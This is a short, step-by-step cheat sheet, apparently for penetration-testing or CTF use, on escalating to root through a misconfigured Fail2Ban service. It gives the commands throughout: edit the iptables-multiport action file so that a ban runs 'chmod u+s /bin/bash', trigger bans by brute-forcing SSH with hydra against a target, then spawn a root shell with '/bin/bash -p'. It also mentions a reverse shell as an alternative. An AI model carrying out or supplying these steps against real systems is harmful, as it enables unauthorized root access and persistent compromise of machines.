# Fail2Ban Privilege Escalation

## Requirements:

Fail2Ban service runs as root, the user has sudo access to use fail2ban and can modify fail2ban configuration files

### 1) Check if user has sudo access, or check for a process that runs fail2ban as root

    sudo -l
    pspy64

### 2) Check if you can modify action configuration files

    ls -la /etc/fail2ban/action.d

### 3) Check the contents of the jail.conf file to see which services are enabled and which files are used that trigger the service (in our example, it is SSH)

    cat /etc/fail2ban/jail.conf

### 4) Replace the ban action with a command of our choosing in the corresponding configuration file

    nano /etc/fail2ban/action.d/iptables-multiport.conf

Values to modify within the file (can be a reverse shell instead of giving SUID bit to bash. SUID bash is more persistent than a reverse shell)

    actionban = chmod u+s /bin/bash
    actionunban = chmod u+s /bin/bash

### 5) Purposefully fail SSH logins to trigger the fail2ban service

    hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt TARGET_IP ssh

### 6) Check bash binary (or check your listener for shell)

    ls -la /bin/bash

### 7) Escalate to root

    /bin/bash -p
